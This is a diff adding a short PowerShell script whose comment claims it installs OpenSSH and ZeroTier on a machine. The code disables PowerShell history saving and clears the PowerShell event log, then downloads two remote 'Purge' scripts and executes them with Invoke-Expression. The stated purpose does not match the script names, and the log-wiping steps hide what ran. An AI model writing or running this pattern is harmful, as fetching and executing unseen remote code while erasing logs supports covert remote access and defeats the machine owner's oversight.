@@ -1,0 +1,11 @@
+<# This script will install openssh and zerotier on a machince once called. #>
+$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
+foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
+Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
+Clear-EventLog "Windows Powershell"
+$LogEngineLifecycleEvent = $false | Out-Null
+[void]$LogEngineLifecycleEvent
+$url1 = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/OpenSSHPurge.ps1"
+$url2 = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/ZTPurge.ps1"
+Invoke-Expression (Invoke-WebRequest -Uri $url1 -UseBasicParsing).Content
+Invoke-Expression (Invoke-WebRequest -Uri $url2 -UseBasicParsing).Content
